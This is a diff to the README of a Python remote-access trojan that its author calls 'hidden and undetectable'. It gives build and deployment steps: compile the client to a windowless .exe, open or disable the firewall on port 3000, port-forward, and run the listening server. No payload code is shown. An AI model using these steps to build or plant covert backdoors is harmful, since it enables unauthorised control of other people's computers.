@@ -7,6 +7,7 @@ This program is an opensource, hidden and undetectable backdoor/reverse shell/RA
 You will need:
 * [Python 3.6+](https://www.python.org/downloads)
 * [Pywin32](https://sourceforge.net/projects/pywin32/files/pywin32/)
+* [Pyinstaller](http://www.pyinstaller.org/downloads.html#)
 
 The program can be downloaded via github or git eg. `git clone https://github.com/xp4xbox/Python-Backdoor`
 
@@ -30,19 +31,14 @@ Currently this program has several features such as:
 
 ## Quick Usage
 
-1. Open client with IDLE or any other editor.
-2. Set your IP address in the quotes on line `7` for `strHost` to use for the server or if you plan to use DNS server, on the line below put in your dns hostname such as: `strHost = socket.gethostbyname("myserver113.ddns.net")`.
-3. **You must also disable your firewall on the server or configure your firewall to allow port 3000**
+1. Run `setup.py` and follow the directions on screen to build the client to .exe.
+2. Check the `dist` folder for the .exe.
+3. **Disable your firewall on the server or configure your firewall to allow port 3000.**
+4. Run the `server.py` to start accepting connections.
 
 > If you plan on using the program outside of your network, you must port forward port 3000.
 
 For more information please refer to the [instructable](https://www.instructables.com/id/Simple-Python-Backdoor/).
-
-### Compiling Client To .exe
-
-#### Pyinstaller
-1. Install [Pyinstaller](http://www.pyinstaller.org/downloads.html#).
-2. Open command prompt and run `pyinstaller client.py --exclude-module FixTk --exclude-module tcl --exclude-module tk --exclude-module _tkinter --exclude-module tkinter --exclude-module Tkinter --onefile --windowed`
 
 ## Help
 
